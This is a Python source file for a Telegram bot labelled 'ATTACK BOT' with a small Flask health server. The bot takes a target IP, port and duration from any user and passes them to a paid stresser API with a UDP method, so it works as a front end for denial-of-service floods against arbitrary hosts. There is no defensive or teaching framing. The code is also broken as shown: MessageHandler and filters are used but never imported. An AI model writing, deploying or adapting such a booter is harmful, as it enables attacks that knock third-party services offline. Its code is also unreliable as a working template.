# app.py - Minimal Working Version
import os
import logging
import asyncio
import threading
from flask import Flask, jsonify
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== BOT IMPORTS =====
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("👤 INFO", callback_data="info")],
    ]
    await update.message.reply_text(
        "🤖 *ATTACK BOT*\n\nUse buttons below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⚔️ *ATTACK*\n\nSend: `IP PORT DURATION`\nExample: `1.1.1.1 80 30`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        # Call API
        import aiohttp
        url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host={target}&port={port}&time={duration}&method=udp"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                result = await response.text()
                
        await update.message.reply_text(
            f"✅ *ATTACK SENT*\nTarget: `{target}:{port}`\nDuration: {duration}s\nResponse: {result[:100]}",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"👤 *USER INFO*\nID: `{query.from_user.id}`\nStatus: Active",
        parse_mode='Markdown'
    )

# ===== RUN BOT =====
def run_bot():
    """Run the bot in a separate thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(attack, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(info, pattern="^info$"))
    app.add_handler(CommandHandler("attack", process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling())
    
    logger.info("✅ Bot started!")
    loop.run_forever()

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 50)
    print("Starting Bot...")
    print("=" * 50)
    
    # Start bot in background
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    
    # Run Flask
    port = int(os.getenv("PORT", 8080))
    flask_app.run(host='0.0.0.0', port=port)